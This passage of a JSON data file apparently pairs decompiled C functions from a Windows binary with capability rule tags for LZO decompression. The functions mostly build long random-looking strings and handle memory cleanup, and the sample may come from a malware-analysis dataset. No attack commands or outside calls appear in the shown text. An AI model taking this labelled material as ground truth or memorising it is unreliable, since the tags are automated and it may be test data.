1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0043aece;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x0043aeda;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000004c) {\n            iVar1 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (iVar1 = *(in_stack_00000038 + -4),  0x1f < (in_stack_00000038 + -4) - iVar1)) goto code_r0x0043aee6;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000064) {\n            iVar1 = in_stack_00000050;\n            if ((0xfff < in_stack_00000064 + 1) &&\n               (iVar1 = *(in_stack_00000050 + -4),  0x1f < (in_stack_00000050 + -4) - iVar1)) goto code_r0x0043aef2;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043ad99;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043aece:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043aeda:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043aee6:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043aef2:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1004
    },
    "00406537": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00406537(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    uint auStack108 [4];\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack108;\n    uStack24 = 0x44c170;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack88 = 0xf;\n    uStack92 = 1;\n    auStack108[0] = 0x72;\n    uStack64 = 0xf;\n    uStack68 = 7;\n    uStack84 = 0x66676275;\n    uStack80 = 0x696e78;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x28);\n    if (uStack40 < 0x10) {\ncode_r0x004231f1:\n        if (0xf < in_stack_00000028) {\n            iVar2 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar2 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar2)) goto code_r0x00423293;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar2 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar2 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar2)) goto code_r0x0042329f;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004231f1;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00423293:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042329f:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 804
    },
    "004066bd": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004066bd(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x414840;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 6;\n    pcStack160 = \"vstlwurbodujvjodfqqaqedlgvofnwnzexeohpbyrfykusrwztnrzslindsjppffmo\";\n    auStack168[0] = 0x42;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x38, iStack84, \"xnkpmtcaplfycqyoopkudrdbxvgtcmnokadhfexhcbiydcjgpnvssxod\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x31, iStack60, \"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x31, iStack132, \"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x31, uStack36, \"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    if (uStack112 < 0x10) {\ncode_r0x0040d2be:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0040d40b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0040d417;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0040d423;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x0040d42f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0040d43b;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x1580;\n    }\n    iVar2 = iStack132;\n    if ((uStack112 + 1 < 0x1000) || (iVar2 = *(iStack132 + -4),  (iStack132 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0040d2be;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040d40b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040d417:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040d423:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040d42f:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0040d43b:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1445
    },
    "0040673a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040673a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44c570;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"xogmuuwnkdlsqmrbcqgonospjtbhwvczpxlwfhfioqew\";\n    auStack96[0] = 0x2c;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x16, uStack36, \"rpkenxynrbzyfzbknlsyky\");\n    if (uStack40 < 0x10) {\ncode_r0x004302b9:\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0043034b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000024) {\n            iVar2 = in_stack_00000010;\n            if ((0xfff < in_stack_00000024 + 1) &&\n               (iVar2 = *(in_stack_00000010 + -4),  0x1f < (in_stack_00000010 + -4) - iVar2)) goto code_r0x00430357;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004302b9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043034b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00430357:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 771
    },
    "0040678f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040678f(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    uint auStack124 [2];\n    char *pcStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack124;\n    uStack24 = 0x44c9c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack44 = 0xf;\n    uStack48 = 0xf;\n    iStack64 = 0x786d6665;\n    uStack60 = 0x71766b6a;\n    uStack56 = 0x6e726578;\n    uStack52 = 0x617971;\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 4;\n    pcStack116 = \"lxwsxfrtljdrapcbkyxxfvzlkbupys\";\n    auStack124[0] = 0x1e;\n    fcn.00402f72();\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x50, uStack36, \"siwrtsplismwhawuesxkqtiyvwdhhjankhgirurksgiobqkbyxaqfdtijxcaytsvfmthotvnyhngxmhv\");\n    *puStack40 = 0;\n    puStack40[4] = 0;\n    puStack40[5] = 0xf;\n    *puStack40 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x12, uStack36, \"sckkytnbjeruofjqkf\");\n    if (uStack68 < 0x10) {\ncode_r0x0043c87c:\n        if (0xf < uStack92) {\n            iVar2 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar2 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar2))\n            goto code_r0x0043c949;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack44) {\n            iVar2 = iStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2))\n            goto code_r0x0043c955;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x0043c961;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack88;\n    if ((uStack68 + 1 < 0x1000) || (iVar2 = *(iStack88 + -4),  (iStack88 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043c87c;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043c949:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043c955:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043c961:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1138
    },
    "00406825": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406825(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t in_stack_00000050;\n    uint32_t in_stack_00000064;\n    uint32_t in_stack_fffffefc;\n    uint auStack192 [2];\n    char *pcStack184;\n    int32_t iStack180;\n    uint uStack164;\n    uint32_t uStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack192;\n    uStack24 = 0x44cba0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack164 = 0;\n    uStack160 = 0xf;\n    iStack180 = 0;\n    uStack20 = 0xb;\n    pcStack184 = \"kvdyvhbuoemfigqnocrukafyvlqyilpbdgyoutytlrvoqhtnckatfjpzmlppxkcnebusxxuangftdz\";\n    auStack192[0] = 0x4e;\n    fcn.00402f72();\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x53, iStack132, \"xnulkwtbjsbwwgbfpuznqjblqbqrrmcwlhwakhylvnqhysgdiyuiozdtwcqganpmiqkslynfhejrlbresrw\")\n    ;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x44, iStack108, \"hkqimwvnchtzeyqjjkluuisutqyuzdxiezdiojwrzitqmwvxhcklqnrobpzaqgobgrxr\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x30, iStack60, \"olfgwlcpmcuyuzxajxeublmbyworvqcrgzgjurgldemhvggj\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x53, uStack84, \"xnulkwtbjsbwwgbfpuznqjblqbqrrmcwlhwakhylvnqhysgdiyuiozdtwcqganpmiqkslynfhejrlbresrw\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0x11;\n    fcn.00402f72(0x53, uStack36, \"xnulkwtbjsbwwgbfpuznqjblqbqrrmcwlhwakhylvnqhysgdiyuiozdtwcqganpmiqkslynfhejrlbresrw\");\n    if (uStack64 < 0x10) {\ncode_r0x00442381:\n        if (0xf < uStack40) {\n            in_stack_fffffefc = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_fffffefc) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x004426a7;\n                in_stack_fffffefc = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xf;\n        fcn.00402f72(0x44, in_stack_fffffefc & 0xffffff00 | uStack84 & 0xff, \n                     \"hkqimwvnchtzeyqjjkluuisutqyuzdxiezdiojwrzitqmwvxhcklqnrobpzaqgobgrxr\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x44, uStack36, \"hkqimwvnchtzeyqjjkluuisutqyuzdxiezdiojwrzitqmwvxhcklqnrobpzaqgobgrxr\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x004426b3;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x004426bf;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x004426cb;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x004426d7;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack136) {\n            iVar3 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar3 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar3))\n            goto code_r0x004426e3;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack160) {\n            iVar3 = iStack180;\n            if ((0xfff < uStack160 + 1) && (iVar3 = *(iStack180 + -4),  0x1f < (iStack180 + -4) - iVar3))\n            goto code_r0x004426ef;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar3 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar3 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar3))\n            goto code_r0x004426fb;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar3 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar3 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar3)) goto code_r0x00442707;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000064) {\n            iVar3 = in_stack_00000050;\n            if ((0xfff < in_stack_00000064 + 1) &&\n               (iVar3 = *(in_stack_00000050 + -4),  0x1f < (in_stack_00000050 + -4) - iVar3)) goto code_r0x00442713;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x5649;\n    }\n    in_stack_fffffefc = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_fffffefc < 0x1000) {\ncode_r0x00442375:\n        fcn.00401a32(uVar2);\n        goto code_r0x00442381;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_fffffefc = uStack64 + 0x24;\n        goto code_r0x00442375;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004426a7:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004426b3:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004426bf:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004426cb:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004426d7:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x004426e3:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x004426ef:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x004426fb:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x00442707:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x00442713:\n    uStack20 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2663
    },
    "004068b1": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004068b1(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44c330;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 8;\n    pcStack160 = \"jfhxxulaurahkccbdztctv\";\n    auStack168[0] = 0x16;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5c, iStack108, \n                 \"xfpcnakltmydvzmyqvoythokjipkmvhnebkmlvjvdoswjgqeftfhzpwrtfzwarqsejkpkiydzrdmvesdrabwgigwvsrw\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x27, iStack60, \"gzbrmjgsahtwuwzmfiywqaptivzgjkzkrkroiqd\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x16, uStack84, \"jfhxxulaurahkccbdztctv\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x16, uStack36, \"jfhxxulaurahkccbdztctv\");\n    if (uStack64 < 0x10) {\ncode_r0x00428ade:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00428d21;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x27, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \"gzbrmjgsahtwuwzmfiywqaptivzgjkzkrkroiqd\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x27, uStack36, \"gzbrmjgsahtwuwzmfiywqaptivzgjkzkrkroiqd\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00428d2d;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00428d39;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00428d45;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x00428d51;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack136) {\n            iVar3 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar3 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar3))\n            goto code_r0x00428d5d;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar3 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar3 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar3))\n            goto code_r0x00428d69;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x00428ad2:\n        fcn.00401a32(uVar2);\n        goto code_r0x00428ade;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x00428ad2;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00428d21:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00428d2d:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00428d39:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00428d45:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00428d51:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00428d5d:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00428d69:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1970
    },
    "0040d030": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
